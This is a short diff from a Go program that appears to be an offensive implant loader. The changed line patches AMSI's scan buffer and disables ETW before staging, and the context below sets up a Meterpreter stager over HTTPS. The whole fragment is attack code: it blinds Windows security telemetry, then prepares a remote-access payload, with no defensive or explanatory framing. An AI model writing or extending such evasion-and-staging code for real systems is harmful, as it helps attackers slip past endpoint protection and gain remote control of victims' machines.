@@ -229,7 +229,7 @@ func main() {
     defer caller.Close()
 
     // Disable AMSI + ETW before staging
-    evasion.Apply(caller, amsi.Technique(), etw.Technique())
+    evasion.ApplyAll([]evasion.Technique{amsi.ScanBufferPatch(), etw.All()}, caller)
 
     stager := meterpreter.NewStager(&meterpreter.Config{
         Transport:    meterpreter.TransportHTTPS,
